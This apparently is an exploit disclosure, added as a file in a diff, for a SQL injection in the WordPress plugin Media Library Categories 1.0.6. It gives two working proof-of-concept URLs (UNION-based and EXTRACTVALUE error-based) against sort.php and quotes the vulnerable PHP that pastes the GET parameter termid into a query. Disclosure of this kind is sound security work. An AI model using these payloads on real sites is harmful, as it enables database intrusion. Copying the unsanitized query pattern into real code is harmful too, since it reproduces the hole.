@@ -1,0 +1,36 @@
+# Exploit Title: Media Library Categories <= 1.0.6 SQL Injection Vulnerability
+# Date: 2011-08-06
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/media-library-categories.1.0.6.zip
+# Version: 1.0.6 (tested)
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/media-library-categories/sort.php?termid=-1 UNION ALL SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
+
+http://www.site.com/wp-content/plugins/media-library-categories/sort.php?termid=1 AND EXTRACTVALUE(1,CONCAT(CHAR(92),@@version))
+
+---------------
+Vulnerable code
+---------------
+$termid=$_GET['termid'];
+
+...
+
+$where = '';
+if($termid)
+{
+    $where .= " && tt.term_id=".$termid;
+} 
+
+...
+
+$query =     "SELECT p.*, a.term_order FROM " . $table_prefix . "posts p
+            inner join " . $table_prefix . "term_relationships a on a.object_id = p.ID
+            inner join " . $table_prefix . "term_taxonomy ttt on ttt.term_taxonomy_id = a.term_taxonomy_id
+            inner join " . $table_prefix . "terms tt on ttt.term_id = tt.term_id
+            where ttt.taxonomy='media_category' $where order by a.term_order asc;";
+
+$results = mysql_query($query); 
+
